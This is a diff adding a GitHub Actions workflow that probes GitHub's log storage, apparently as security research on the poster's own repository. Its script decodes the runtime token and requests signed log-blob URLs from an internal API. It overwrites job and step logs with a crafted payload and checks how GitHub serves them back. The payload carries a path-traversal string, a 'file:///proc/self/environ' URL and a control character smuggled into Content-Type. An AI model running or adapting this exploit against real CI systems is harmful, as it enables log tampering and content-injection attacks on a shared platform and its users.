@@ -1,0 +1,74 @@
+name: Probe live Actions log blob carrier
+on:
+  workflow_dispatch:
+permissions:
+  actions: read
+  contents: read
+jobs:
+  carrier:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Carrier probe
+        uses: actions/github-script@v8
+        env:
+          GH_TOKEN: ${{ github.token }}
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const repo = process.env.GITHUB_REPOSITORY;
+            const runId = Number(process.env.GITHUB_RUN_ID);
+            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
+            const results = process.env.ACTIONS_RESULTS_URL;
+            if (!runtime || !results) throw new Error('Actions runtime token/URL missing');
+            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
+            const ids = {workflow_run_backend_id: scope.split(':')[1], workflow_job_run_backend_id: scope.split(':')[2]};
+            const base = 'https://api.github.com/repos/' + repo;
+            const headers = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-live-log-probe'};
+            const jobsResponse = await fetch(base + '/actions/runs/' + runId + '/jobs?per_page=100', {headers});
+            if (!jobsResponse.ok) throw new Error('list jobs HTTP ' + jobsResponse.status);
+            const jobs = (await jobsResponse.json()).jobs;
+            const job = jobs.find(x => x.name === process.env.GITHUB_JOB);
+            const step = job && job.steps.find(x => x.name === 'Carrier probe');
+            if (!job || !step) throw new Error('current job/step not listed');
+            const payload = Buffer.from(JSON.stringify({full_name: 'x/../' + repo + '/actions/jobs/' + job.id + '/steps/' + step.number + '/logs', owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'self-owned live log carrier test', stargazers_count: 7}));
+            async function twirp(method, data) {
+              const response = await fetch(new URL('twirp/results.services.receiver.Receiver/' + method, results), {method: 'POST', headers: {Authorization: 'Bearer ' + runtime, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
+              const body = await response.text();
+              if (!response.ok) throw new Error(method + ' HTTP ' + response.status + ': ' + body.slice(0,180));
+              return JSON.parse(body);
+            }
+            async function uploadAndRead(label, method, data, endpoint) {
+              try {
+                const signed = await twirp(method, data);
+                const url = signed.logs_url;
+                if (!url) throw new Error('no logs_url');
+                const sas = new URL(url);
+                const put = await fetch(url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/json\u0085', 'x-ms-version': '2023-11-03'}, body: payload});
+                console.log(label + ' PUT=' + put.status + ' azure=' + (put.headers.get('x-ms-error-code') || '') + ' sp=' + sas.searchParams.get('sp') + ' host=' + sas.host);
+                await put.arrayBuffer();
+                let last = null;
+                for (let i = 0; i < 25; i++) {
+                  const first = await fetch(endpoint, {headers, redirect: 'manual'});
+                  if (first.status === 302 && first.headers.get('location')) {
+                    const raw = await fetch(first.headers.get('location'));
+                    const body = Buffer.from(await raw.arrayBuffer());
+                    const type = raw.headers.get('content-type') || '';
+                    let json = false; try { JSON.parse(body.toString('utf8')); json = true; } catch {}
+                    console.log(label + ' API=302 RAW=' + raw.status + ' MIME=' + JSON.stringify(type) + ' N=' + body.length + ' JSON=' + json + ' EXACT=' + body.equals(payload) + ' HEAD=' + body.subarray(0,16).toString('hex'));
+                    return;
+                  }
+                  last = first.status + ' ' + (first.headers.get('content-type') || '');
+                  await first.body?.cancel();
+                  await new Promise(r => setTimeout(r, 200));
+                }
+                console.log(label + ' no redirect after polling; final=' + last);
+              } catch (error) { console.log(label + ' ERROR=' + error.message); }
+            }
+            const jobPage = await fetch('https://github.com/' + repo + '/actions/runs/' + runId + '/job/' + job.id, {headers: {'User-Agent': 'own-live-log-probe'}});
+            const html = await jobPage.text();
+            const stepMatch = new RegExp('data-name="Run actions/github-script@v8"[\\s\\S]{0,1600}?data-external-id="([0-9a-f-]{36})"', 'i').exec(html);
+            console.log('JOB=' + job.id + ' STEP=' + step.number + ' STEP_BACKEND=' + (stepMatch ? stepMatch[1] : 'missing') + ' PAYLOAD=' + payload.length);
+            await uploadAndRead('JOB_LOG', 'GetJobLogsSignedBlobURL', ids, base + '/actions/jobs/' + job.id + '/logs');
+            if (stepMatch) await uploadAndRead('STEP_LOG', 'GetStepLogsSignedBlobURL', {...ids, step_backend_id: stepMatch[1]}, base + '/actions/jobs/' + job.id + '/steps/' + step.number + '/logs');
